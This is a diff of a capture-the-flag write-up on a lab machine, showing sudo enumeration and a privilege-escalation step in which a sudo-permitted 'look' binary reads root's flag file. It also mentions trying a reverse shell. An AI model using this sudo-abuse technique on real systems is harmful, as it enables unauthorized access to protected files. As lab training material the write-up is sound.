@@ -316,14 +316,42 @@ think@ip-10-10-219-52:~$ cat user.txt
 **********************************
 ```
 
-time for the ubuntu user
 
 ```bash
-think@ip-10-10-219-52:/home$ ls -la
-total 20
-drwxr-xr-x  5 root     root     4096 Jun 27 14:58 .
-drwxr-xr-x 19 root     root     4096 Jun 27 14:58 ..
-drwxr-xr-x  2 ssm-user ssm-user 4096 May 28 19:20 ssm-user
-drwxr-xr-x  5 think    think    4096 Jan 11  2024 think
-drwxr-xr-x  3 ubuntu   ubuntu   4096 Jun 27 14:58 ubuntu
+think@ip-10-10-219-52:/home$ sudo -l
+[sudo] password for think: 
+Matching Defaults entries for think on ip-10-10-219-52:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User think may run the following commands on ip-10-10-219-52:
+    (ALL) /usr/bin/look
 ```
+
+
+```bash
+think@ip-10-10-219-52:/home$ sudo look /root/root.txt
+look: /usr/share/dict/words: No such file or directory
+```
+
+```bash
+think@ip-10-10-219-52:/home$ ls /usr/share/dict/words
+ls: cannot access '/usr/share/dict/words': No such file or directory
+think@ip-10-10-219-52:/home$ ls /usr/share/dict/
+think@ip-10-10-219-52:/home$ ls -la /usr/share/dict/
+total 8
+drwxr-xr-x   2 root root 4096 Apr 15  2020 .
+drwxr-xr-x 123 root root 4096 Jul 30  2023 ..
+```
+
+Maybe we can try to add here some bash reverse shell and try to run it.
+
+But we cant beacuse we dont have any write permissions for this directory.
+
+We don't need this
+
+```bash
+think@ip-10-10-219-52:/home$ sudo /usr/bin/look '' /root/root.txt
+*********************************
+```
+
